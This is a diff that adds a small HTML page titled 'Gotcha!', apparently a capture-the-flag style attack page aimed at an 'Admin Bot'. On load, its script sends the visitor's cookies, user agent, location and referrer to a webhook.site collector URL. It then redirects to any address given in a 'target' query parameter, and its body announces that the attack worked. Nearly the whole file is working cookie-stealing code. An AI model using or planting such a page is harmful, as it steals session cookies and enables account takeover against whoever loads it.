@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Gotcha!</title>
+  <script>
+    fetch('https://webhook.site/your-unique-url', {
+      method: "POST",
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        cookies: document.cookie,
+        userAgent: navigator.userAgent,
+        location: window.location.href,
+        referrer: document.referrer
+      })
+    });
+
+    const params = new URLSearchParams(window.location.search);
+    if(params.has('target')) {
+      window.location = params.get('target');
+    }
+  </script>
+</head>
+<body>
+  <h1>Hello, Admin Bot!</h1>
+  <p>If you see this, the attack worked.</p>
+</body>
+</html>
